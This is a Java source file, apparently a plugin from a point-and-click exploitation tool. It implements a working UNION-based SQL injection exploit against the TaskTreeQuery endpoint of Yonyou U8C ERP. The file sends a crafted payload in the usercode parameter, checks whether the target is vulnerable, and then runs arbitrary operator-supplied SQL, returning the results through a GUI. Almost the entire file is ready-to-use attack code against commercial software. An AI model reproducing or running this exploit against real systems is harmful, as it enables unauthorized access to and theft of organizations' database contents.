package exp.oa.yongyou.u8c;

import com.alibaba.fastjson.JSON;
import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.HashMap;

public class yongyou_U8C_BlurTypeQuery_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {

        return attcmd(url,cmd, textArea, textArea_cmd);
    }
    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            Response get_res = HttpTools.get(url + "/service/~iufo/nc.itf.iufo.mobilereport.task.TaskTreeQuery?usercode=211%27+UNION+all+SELECT+1,ascii('a'),3,4,5,6,7,8,9--+" , head, "utf-8");
            if (get_res.getCode() == 200 && get_res.getText().contains("97")) {
                Platform.runLater(() -> {
//                    textArea.appendText("\n 漏洞存在 输入cmd开始构造回显");
                    textArea.appendText("\n [ yongyou_U8C_BlurTypeQuery_sqli ]");
                    textArea.appendText("\n 利用CMD进行利用,注入类型联合注入,数据库:sqlserver");
                    textArea.appendText("\n eg: char(97) 或 user_name()");
                    textArea.appendText("\n");
                });

                String target_req = url+"/service/~iufo/nc.itf.iufo.mobilereport.task.TaskTreeQuery?usercode=211%27+UNION+all+SELECT+1,ascii('a'),3,4,5,6,7,8,9--+";
                Platform.runLater(() -> {
                    textArea_cmd.appendText("\n"+target_req);
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    private Boolean attcmd(String url,String sql, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            Response get_res = HttpTools.get(url + "/service/~iufo/nc.itf.iufo.mobilereport.task.TaskTreeQuery?usercode=211%27+UNION+all+SELECT+1,"+sql+",3,4,5,6,7,8,9--+" , head, "utf-8");
            if (get_res.getCode() == 200 && get_res.getText().contains("message")) {
                String finalVar = JSON.parseObject(get_res.getText()).get("message").toString();
                Platform.runLater(() -> {
                    textArea.appendText("\n SQL语句: "+sql);
                    textArea_cmd.appendText(finalVar +"\n");
                    textArea.appendText("\n");
                });

                return true;
            }else {
                Platform.runLater(() -> {
                    textArea.appendText("\n SQL语句: "+sql+" 执行失败");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
